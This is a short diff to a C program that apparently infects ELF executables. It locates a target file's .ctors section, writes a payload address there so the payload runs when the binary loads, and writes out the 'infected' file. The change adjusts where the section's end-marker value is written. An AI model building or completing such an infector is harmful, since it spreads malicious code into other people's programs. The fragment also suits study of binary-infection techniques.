@@ -43,6 +43,7 @@ int main(int argc, char *argv[]){
     return -1;
   }
 
+  //set up the headers and tables for the target file
   ELFN(Ehdr) *targetElfHeader = target;
   ELFN(Phdr) *targetProgramHeaderTable = target + targetElfHeader->e_phoff;
   ELFN(Shdr) *targetSectionHeaderTable = target + targetElfHeader->e_shoff;
@@ -118,7 +119,6 @@ int main(int argc, char *argv[]){
   ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
   char* infectedStringTableValues = infected + infectedStringTable->sh_offset;
 
-
   //find the .ctors
   ELFN(Shdr) *ctors;
   i = 0;
@@ -132,7 +132,8 @@ int main(int argc, char *argv[]){
 
   //add our payload to the ctors
   *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
-  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
+  //*(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
+  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
 
 
   //write out the newly infected file
